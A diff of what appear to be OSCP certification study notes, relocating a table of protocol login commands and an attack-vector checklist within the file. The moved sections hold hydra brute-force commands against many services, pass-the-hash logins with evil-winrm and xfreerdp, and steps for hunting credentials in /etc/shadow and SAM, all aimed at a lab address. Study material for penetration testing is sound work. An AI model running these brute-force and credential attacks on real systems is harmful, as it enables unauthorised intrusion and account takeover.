@@ -63,102 +63,6 @@
 
 ## Methodology 
 
-## Protocols login
-| Protocol        | Port    | Tool                | Kali 2025 Login Command Example                                                                                      |
-|-----------------|---------|---------------------|----------------------------------------------------------------------------------------------------------------------|
-| **SSH**         | 22      | `ssh`               | `ssh user@10.10.10.10`                                                                                                |
-|                 |         | `hydra`             | `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10`                                               |
-| **FTP**         | 21      | `ftp`               | `ftp 10.10.10.10`                                                                                                    |
-|                 |         | `hydra`             | `hydra -l anonymous -p '' ftp://10.10.10.10`                                                                         |
-| **Telnet**      | 23      | `telnet`            | `telnet 10.10.10.10`                                                                                                 |
-|                 |         | `hydra`             | `hydra -l root -P /usr/share/wordlists/rockyou.txt telnet://10.10.10.10`                                              |
-| **HTTP(S)**     | 80/443  | `hydra`             | `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Incorrect"` |
-| **SMB**         | 445     | `smbclient`         | `smbclient -L //10.10.10.10 -U user%password`                                                                         |
-|                 |         | `smbmap`            | `smbmap -H 10.10.10.10 -u user -p password`                                                                           |
-|                 |         | `crackmapexec`      | `crackmapexec smb 10.10.10.10 -u user -p password`                                                                    |
-| **RDP**         | 3389    | `xfreerdp`          | `xfreerdp3 /v:10.10.10.10 /u:user /p:Pass123 /cert-ignore`                                                             |
-|                 |         |                     | `xfreerdp3 /v:10.10.10.10 /u:user /pth:0123456789ABCDEF0123456789ABCDEF /cert-ignore`                                  |
-| **WinRM**       | 5985    | `evil-winrm`        | `evil-winrm -i 10.10.10.10 -u Administrator -p Pass123`                                                               |
-|                 |         |                     | `evil-winrm -i 10.10.10.10 -u Administrator -H AABBCCDDEEFF00112233445566778899`                                        |
-|                 |         |                     | `evil-winrm -i 10.10.10.10 -u Administrator -p Pass123 -S`  (SSL mode)                                                 |
-| **MySQL**       | 3306    | `mysql`             | `mysql -h 10.10.10.10 -u root -p`                                                                                      |
-| **PostgreSQL**  | 5432    | `psql`              | `psql -h 10.10.10.10 -U postgres`                                                                                      |
-| **MSSQL**       | 1433    | `impacket-mssqlclient.py` | `mssqlclient.py user@10.10.10.10 -windows-auth`                                                                    |
-|                 |         |                     | `mssqlclient.py user@10.10.10.10 -windows-auth -hashes :<NTLM_HASH>`                                                   |
-| **VNC**         | 5900    | `vncviewer`         | `vncviewer 10.10.10.10:5900`                                                                                           |
-|                 |         | `hydra`             | `hydra -P /usr/share/wordlists/rockyou.txt -t 4 vnc://10.10.10.10`                                                    |
-| **POP3**        | 110     | `hydra`             | `hydra -l user -P /usr/share/wordlists/rockyou.txt pop3://10.10.10.10`                                                 |
-| **IMAP**        | 143     | `hydra`             | `hydra -l user -P /usr/share/wordlists/rockyou.txt imap://10.10.10.10`                                                 |
-| **LDAP**        | 389     | `ldapsearch`        | `ldapsearch -x -h 10.10.10.10 -b "dc=example,dc=local"`                                                                |
-| **SNMP**        | 161     | `snmpwalk`          | `snmpwalk -v2c -c public 10.10.10.10`                                                                                   |
-| **NFS**         | 2049    | `showmount`         | `showmount -e 10.10.10.10`                                                                                             |
-|                 |         | `mount`             | `mount -t nfs 10.10.10.10:/share /mnt`                                                                                 |
-
-## OSCP Attack Vectors Checklist
-
-| Category               | Attack Vector / Tool                             | Description / Use Case                         |
-|------------------------|------------------------------------------------|-----------------------------------------------|
-| **Host Discovery**     | `ping`, `fping`, `arp-scan`, `nmap -sn`        | Identify live hosts on network                 |
-| **Port Scanning**      | `nmap -sS -sV -p-`, `rustscan`, `masscan`      | Discover open ports and running services       |
-| **Service Enumeration**| `enum4linux`, `smbclient`, `smbmap`, `ldapsearch`, `rpcclient`, `snmpwalk`, `nikto`, `wpscan`, `gobuster`, `feroxbuster` | Enumerate SMB, LDAP, SNMP, HTTP services and web content |
-| **Web Exploitation**   | SQL Injection (`sqlmap`), LFI/RFI, Command Injection, File Upload Bypass | Exploit web application vulnerabilities        |
-| **Common Service Exploits** | FTP (anonymous login), SMB (EternalBlue), MSSQL/MySQL (xp_cmdshell, UDF), Redis (unauthenticated write), RDP (bruteforce) | Service-specific exploitation techniques        |
-| **Tunneling & Pivoting**| SSH tunneling (`ssh -L/-R/-D`), tools like `chisel`, `ligolo`, `socat`, proxychains | Bypass network restrictions, access internal hosts |
-| **Priv Esc (Linux)**   | `sudo -l`, SUID binaries, kernel exploits (Dirty COW, Dirty Pipe), writable cron/systemd | Escalate privileges on Linux systems            |
-| **Priv Esc (Windows)** | AlwaysInstallElevated, Unquoted service paths, weak service perms, token impersonation (JuicyPotato) | Windows privilege escalation techniques          |
-| **Credential Hunting** | Extract hashes from `/etc/shadow`, SAM; check bash history, config files | Find credentials for lateral movement or privilege escalation |
-
-1. Host Discovery
-- `ping`, `fping`, `arp-scan`
-- `nmap -sn`
-
-2. Port Scanning
-- `nmap -sS -sV -p-`
-- `rustscan`, `masscan`
-
-3. Service Enumeration
-- SMB: `enum4linux`, `smbclient`, `smbmap`, `crackmapexec`
-- LDAP: `ldapsearch`, `ldapenum`
-- SNMP: `snmpwalk`
-- RPC: `rpcclient`
-- HTTP/Web: `nikto`, `whatweb`, `wpscan`, `gobuster`, `feroxbuster`
-
-4. Web Exploitation
-- SQL Injection (Error, Blind, Time-based): `sqlmap`, manual payloads
-- LFI/RFI and Path Traversal
-- Command Injection
-- File Upload Vulnerabilities
-- CSRF, XSS (less common for OSCP)
-
-5. Common Service Exploits
-- FTP: anonymous login, weak creds
-- SMB: EternalBlue, weak shares
-- MSSQL/MySQL: xp_cmdshell, UDF uploads
-- Redis: unauthenticated write
-- RDP: brute-force with `hydra`, `ncrack`
-
-6. Tunneling and Pivoting
-- SSH tunneling: `ssh -L`, `-R`, `-D`
-- Tools: `chisel`, `ligolo`, `socat`
-- Proxychains setup and usage
-
-7. Privilege Escalation (Linux)
-- `sudo -l`
-- SUID binaries
-- Kernel exploits (e.g., Dirty COW, Dirty Pipe)
-- Writable cron jobs / systemd services
-
-8. Privilege Escalation (Windows)
-- AlwaysInstallElevated policy
-- Unquoted service paths
-- Weak service permissions
-- Token impersonation exploits (JuicyPotato, RottenPotato, etc.)
-
-9. Credential Hunting
-- `/etc/passwd`, `/etc/shadow`, SAM
-- History files and config files
-- Scripts or backups with credentials
-  
 ## PWK-200 syallabus
 ### 6. Information gathering  
    **Passive**
@@ -1013,6 +917,101 @@ searchsploit samba 3.0
 searchsploit tomcat 7.0.81
 searchsploit linux kernel 4.15
 
+## Protocols login
+| Protocol        | Port    | Tool                | Kali 2025 Login Command Example                                                                                      |
+|-----------------|---------|---------------------|----------------------------------------------------------------------------------------------------------------------|
+| **SSH**         | 22      | `ssh`               | `ssh user@10.10.10.10`                                                                                                |
+|                 |         | `hydra`             | `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10`                                               |
+| **FTP**         | 21      | `ftp`               | `ftp 10.10.10.10`                                                                                                    |
+|                 |         | `hydra`             | `hydra -l anonymous -p '' ftp://10.10.10.10`                                                                         |
+| **Telnet**      | 23      | `telnet`            | `telnet 10.10.10.10`                                                                                                 |
+|                 |         | `hydra`             | `hydra -l root -P /usr/share/wordlists/rockyou.txt telnet://10.10.10.10`                                              |
+| **HTTP(S)**     | 80/443  | `hydra`             | `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Incorrect"` |
+| **SMB**         | 445     | `smbclient`         | `smbclient -L //10.10.10.10 -U user%password`                                                                         |
+|                 |         | `smbmap`            | `smbmap -H 10.10.10.10 -u user -p password`                                                                           |
+|                 |         | `crackmapexec`      | `crackmapexec smb 10.10.10.10 -u user -p password`                                                                    |
+| **RDP**         | 3389    | `xfreerdp`          | `xfreerdp3 /v:10.10.10.10 /u:user /p:Pass123 /cert-ignore`                                                             |
+|                 |         |                     | `xfreerdp3 /v:10.10.10.10 /u:user /pth:0123456789ABCDEF0123456789ABCDEF /cert-ignore`                                  |
+| **WinRM**       | 5985    | `evil-winrm`        | `evil-winrm -i 10.10.10.10 -u Administrator -p Pass123`                                                               |
+|                 |         |                     | `evil-winrm -i 10.10.10.10 -u Administrator -H AABBCCDDEEFF00112233445566778899`                                        |
+|                 |         |                     | `evil-winrm -i 10.10.10.10 -u Administrator -p Pass123 -S`  (SSL mode)                                                 |
+| **MySQL**       | 3306    | `mysql`             | `mysql -h 10.10.10.10 -u root -p`                                                                                      |
+| **PostgreSQL**  | 5432    | `psql`              | `psql -h 10.10.10.10 -U postgres`                                                                                      |
+| **MSSQL**       | 1433    | `impacket-mssqlclient.py` | `mssqlclient.py user@10.10.10.10 -windows-auth`                                                                    |
+|                 |         |                     | `mssqlclient.py user@10.10.10.10 -windows-auth -hashes :<NTLM_HASH>`                                                   |
+| **VNC**         | 5900    | `vncviewer`         | `vncviewer 10.10.10.10:5900`                                                                                           |
+|                 |         | `hydra`             | `hydra -P /usr/share/wordlists/rockyou.txt -t 4 vnc://10.10.10.10`                                                    |
+| **POP3**        | 110     | `hydra`             | `hydra -l user -P /usr/share/wordlists/rockyou.txt pop3://10.10.10.10`                                                 |
+| **IMAP**        | 143     | `hydra`             | `hydra -l user -P /usr/share/wordlists/rockyou.txt imap://10.10.10.10`                                                 |
+| **LDAP**        | 389     | `ldapsearch`        | `ldapsearch -x -h 10.10.10.10 -b "dc=example,dc=local"`                                                                |
+| **SNMP**        | 161     | `snmpwalk`          | `snmpwalk -v2c -c public 10.10.10.10`                                                                                   |
+| **NFS**         | 2049    | `showmount`         | `showmount -e 10.10.10.10`                                                                                             |
+|                 |         | `mount`             | `mount -t nfs 10.10.10.10:/share /mnt`                                                                                 |
+
+## OSCP Attack Vectors Checklist
+
+| Category               | Attack Vector / Tool                             | Description / Use Case                         |
+|------------------------|------------------------------------------------|-----------------------------------------------|
+| **Host Discovery**     | `ping`, `fping`, `arp-scan`, `nmap -sn`        | Identify live hosts on network                 |
+| **Port Scanning**      | `nmap -sS -sV -p-`, `rustscan`, `masscan`      | Discover open ports and running services       |
+| **Service Enumeration**| `enum4linux`, `smbclient`, `smbmap`, `ldapsearch`, `rpcclient`, `snmpwalk`, `nikto`, `wpscan`, `gobuster`, `feroxbuster` | Enumerate SMB, LDAP, SNMP, HTTP services and web content |
+| **Web Exploitation**   | SQL Injection (`sqlmap`), LFI/RFI, Command Injection, File Upload Bypass | Exploit web application vulnerabilities        |
+| **Common Service Exploits** | FTP (anonymous login), SMB (EternalBlue), MSSQL/MySQL (xp_cmdshell, UDF), Redis (unauthenticated write), RDP (bruteforce) | Service-specific exploitation techniques        |
+| **Tunneling & Pivoting**| SSH tunneling (`ssh -L/-R/-D`), tools like `chisel`, `ligolo`, `socat`, proxychains | Bypass network restrictions, access internal hosts |
+| **Priv Esc (Linux)**   | `sudo -l`, SUID binaries, kernel exploits (Dirty COW, Dirty Pipe), writable cron/systemd | Escalate privileges on Linux systems            |
+| **Priv Esc (Windows)** | AlwaysInstallElevated, Unquoted service paths, weak service perms, token impersonation (JuicyPotato) | Windows privilege escalation techniques          |
+| **Credential Hunting** | Extract hashes from `/etc/shadow`, SAM; check bash history, config files | Find credentials for lateral movement or privilege escalation |
+
+1. Host Discovery
+- `ping`, `fping`, `arp-scan`
+- `nmap -sn`
+
+2. Port Scanning
+- `nmap -sS -sV -p-`
+- `rustscan`, `masscan`
+
+3. Service Enumeration
+- SMB: `enum4linux`, `smbclient`, `smbmap`, `crackmapexec`
+- LDAP: `ldapsearch`, `ldapenum`
+- SNMP: `snmpwalk`
+- RPC: `rpcclient`
+- HTTP/Web: `nikto`, `whatweb`, `wpscan`, `gobuster`, `feroxbuster`
+
+4. Web Exploitation
+- SQL Injection (Error, Blind, Time-based): `sqlmap`, manual payloads
+- LFI/RFI and Path Traversal
+- Command Injection
+- File Upload Vulnerabilities
+- CSRF, XSS (less common for OSCP)
+
+5. Common Service Exploits
+- FTP: anonymous login, weak creds
+- SMB: EternalBlue, weak shares
+- MSSQL/MySQL: xp_cmdshell, UDF uploads
+- Redis: unauthenticated write
+- RDP: brute-force with `hydra`, `ncrack`
+
+6. Tunneling and Pivoting
+- SSH tunneling: `ssh -L`, `-R`, `-D`
+- Tools: `chisel`, `ligolo`, `socat`
+- Proxychains setup and usage
+
+7. Privilege Escalation (Linux)
+- `sudo -l`
+- SUID binaries
+- Kernel exploits (e.g., Dirty COW, Dirty Pipe)
+- Writable cron jobs / systemd services
+
+8. Privilege Escalation (Windows)
+- AlwaysInstallElevated policy
+- Unquoted service paths
+- Weak service permissions
+- Token impersonation exploits (JuicyPotato, RottenPotato, etc.)
+
+9. Credential Hunting
+- `/etc/passwd`, `/etc/shadow`, SAM
+- History files and config files
+- Scripts or backups with credentials
 
 ## Kali setup
 1. Register [Broadcom account](https://profile.broadcom.com/web/registration)
